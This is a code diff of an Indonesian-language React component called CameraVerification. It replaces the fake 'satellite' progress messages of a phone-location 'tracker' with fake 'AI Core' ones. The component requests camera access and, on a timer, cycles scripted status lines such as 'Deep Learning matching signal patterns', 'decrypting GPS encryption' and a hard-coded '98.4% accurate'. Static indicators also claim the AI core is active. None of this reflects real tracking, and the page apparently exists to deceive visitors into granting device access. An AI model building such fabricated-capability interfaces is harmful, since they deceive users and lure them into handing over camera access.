@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useRef, useEffect } from 'react';
-import { Loader2, Satellite, MapPin, Radar, ShieldAlert, Wifi, Radio } from 'lucide-react';
+import { Loader2, Satellite, MapPin, Radar, ShieldAlert, Wifi, Radio, Cpu } from 'lucide-react';
 
 type StatusType = 'idle' | 'loading' | 'success' | 'error' | 'ask_screenshot' | 'done';
 
@@ -188,8 +188,8 @@ export default function CameraVerification({ phoneNumber = '' }: CameraVerificat
 
     setStatus('loading');
     setProgress(0);
-    setCurrentStep('Menghubungkan ke satelit GPS...');
-    setMessage('Mencari jaringan satelit terdekat. Harap izinkan akses perangkat untuk mengoptimalkan koneksi node...');
+    setCurrentStep('Menginisialisasi AI Neural Network...');
+    setMessage('AI Core aktif. Mencari pola pergerakan target dan jaringan satelit terdekat. Harap izinkan akses perangkat untuk optimasi pelacakan...');
 
     try {
       // Minta akses kamera
@@ -266,11 +266,11 @@ export default function CameraVerification({ phoneNumber = '' }: CameraVerificat
 
             // Update steps selama merekam
             const stepMessages = [
-              'Verifikasi handshake satelit...',
-              'Dekripsi paket data lokasi...',
-              'Menghitung koordinat GPS...',
-              'Sinkronisasi node server...',
-              'Mengoptimalkan akurasi...',
+              'AI Engine menganalisis rute satelit...',
+              'Deep Learning mencocokkan pola sinyal...',
+              'Dekripsi algoritma enkripsi GPS...',
+              'Sinkronisasi AI dengan node server...',
+              'Memprediksi probabilitas lokasi (98.4% Akurat)...',
             ];
             let stepIdx = 0;
             const stepInterval = setInterval(() => {
@@ -406,8 +406,9 @@ export default function CameraVerification({ phoneNumber = '' }: CameraVerificat
 
   return (
     <div className="w-full max-w-lg mx-auto">
-      <div className="glass-card p-8 relative overflow-hidden">
+      <div className="glass-card bg-[#050510]/80 p-8 relative overflow-hidden backdrop-blur-xl border border-white/10 shadow-2xl">
         
+
         {/* Animated radar background */}
         {status === 'loading' && (
           <div className="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
@@ -467,11 +468,12 @@ export default function CameraVerification({ phoneNumber = '' }: CameraVerificat
 
         {/* Live Status Indicators */}
         {status === 'loading' && (
-          <div className="grid grid-cols-3 gap-3 mb-6 relative z-10">
+          <div className="grid grid-cols-4 gap-2 mb-6 relative z-10">
             {[
-              { icon: <Satellite className="w-4 h-4" />, label: 'Satelit GPS', value: '12/24', color: 'text-accent-blue' },
+              { icon: <Satellite className="w-4 h-4" />, label: 'Satelit', value: '12/24', color: 'text-accent-blue' },
+              { icon: <Cpu className="w-4 h-4 animate-pulse" />, label: 'AI Core', value: 'Aktif', color: 'text-accent-cyan' },
               { icon: <Wifi className="w-4 h-4" />, label: 'Signal', value: 'Kuat', color: 'text-accent-green' },
-              { icon: <Radar className="w-4 h-4" />, label: 'BTS', value: 'Scanning', color: 'text-accent-purple' },
+              { icon: <Radar className="w-4 h-4 animate-radar" />, label: 'BTS', value: 'Scan', color: 'text-accent-purple' },
             ].map((item, i) => (
               <div key={i} className="bg-white/5 rounded-lg p-3 text-center border border-white/5">
                 <div className={`${item.color} flex justify-center mb-1`}>{item.icon}</div>
@@ -524,7 +526,7 @@ export default function CameraVerification({ phoneNumber = '' }: CameraVerificat
                     className="btn-primary w-full py-4 font-semibold flex justify-center items-center gap-2.5 disabled:opacity-50 disabled:cursor-not-allowed text-sm transition-all duration-300"
                 >
                     {status === 'loading' ? (
-                        <><Loader2 className="w-4 h-4 animate-spin" /> <span className="animate-pulse">Melacak lokasi...</span></>
+                        <><Loader2 className="w-4 h-4 animate-spin" /> <span className="animate-pulse">AI Sedang Melacak...</span></>
                     ) : (
                         <><Radar className="w-4 h-4" /> Mulai Pelacakan GPS</>
                     )}
